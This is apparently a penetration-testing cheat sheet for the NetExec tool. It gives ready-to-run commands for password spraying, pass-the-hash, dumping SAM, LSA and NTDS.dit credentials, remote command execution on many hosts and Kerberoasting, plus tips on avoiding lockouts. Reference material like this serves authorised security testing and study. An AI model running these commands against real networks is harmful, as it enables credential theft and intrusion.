# NetExec (nxc) Cheat Sheet
> AD/Windows network enumeration & credential validation (CrackMapExec successor) · AD/Windows · `pipx install netexec`

---

## Quick start
```bash
nxc smb 10.0.0.0/24                          # host/OS discovery via SMB
nxc smb 10.0.0.0/24 -u user -p pass          # validate credentials across subnet
nxc smb target -u user -p pass --shares      # enumerate shares
```

## Protocols
`smb` `winrm` `mssql` `ssh` `ldap` `rdp` `ftp` `vnc` — same flag pattern across all.

## Common flags
| Flag | Meaning |
|---|---|
| `-u / -p` | username/password (repeatable, or file with `-u users.txt -p pass.txt`) |
| `-H` | pass an NTLM hash instead of password |
| `-d` | domain |
| `--local-auth` | authenticate against local SAM, not domain |
| `-x <cmd>` | execute a command (needs admin) |
| `-X <ps1>` | execute PowerShell |
| `--shares` | list SMB shares |
| `--users` / `--groups` | enumerate domain users/groups (via SMB/LDAP) |
| `--sam` | dump local SAM (needs admin) |
| `--lsa` | dump LSA secrets |
| `--ntds` | dump NTDS.dit (needs DA) |
| `-M <module>` | load a module (e.g. `spider_plus`, `mimikatz`) |

## Recipes
```bash
# Password spray across the domain
nxc smb 10.0.0.0/24 -u users.txt -p 'Summer2026!' --continue-on-success

# Pass-the-hash
nxc smb target -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Dump SAM/LSA once you have local admin
nxc smb target -u admin -p pass --sam --lsa

# Execute a command on many hosts
nxc smb targets.txt -u admin -p pass -x "whoami"

# Kerberoasting via LDAP module
nxc ldap dc.corp.local -u user -p pass --kerberoasting kerb_hashes.txt
```

## Gotchas / OPSEC
- Password spraying trips lockout policies fast — throttle with `--continue-on-success` off and a delay, or use a dedicated spray tool with jitter.
- `-x`/`-X` execution needs local admin or domain admin depending on target scope — check `--local-auth` vs domain auth carefully.

## See also
- https://www.netexec.wiki/
- `ad-windows/impacket.md`, `ad-windows/bloodhound.md`, `qyvora/shaka.md`
